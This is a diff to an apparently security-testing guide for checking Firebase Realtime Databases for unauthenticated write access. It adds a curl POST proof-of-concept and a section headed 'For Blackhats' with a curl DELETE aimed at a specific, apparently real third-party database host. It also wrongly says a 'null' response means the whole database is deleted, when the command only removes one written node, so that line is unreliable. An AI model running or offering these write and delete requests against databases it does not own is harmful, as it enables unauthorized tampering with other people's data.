@@ -48,12 +48,18 @@ This command will:
 Try sending a write request to check if the Firebase database allows unauthenticated write access:
 
 ```bash
-curl -X POST https://<subdomain>.firebaseio.com/.json \
-     -d '{"test":"subhashis_exploit_poc"}' \
-     -H "Content-Type: application/json"
+curl -X POST https://<subdomain>.firebaseio.com/.json -d '{"test":"subhashis_exploit_poc"}' -H "Content-Type: application/json"
 ```
 
-If the request is successful and data is written, the Firebase database is vulnerable to **unauthenticated write access**.
+If the request is successful and data is written and return {"name":"-OKELb6ZxxxxDEiDm7W"} , the Firebase database is vulnerable to **unauthenticated write access**.
+
+## ✍️ Step 3+: How remove the poc For Blackhats 🎩
+
+```bash
+curl -X DELETE https://pm-kisan-gullu-1823-14-1-25-default-rtdb.firebaseio.com/-OKELb6ZxxxxDEiDm7W.json
+```
+
+If the request is successful and response is "null" , the Firebase database is deleted.
 
 ---
 
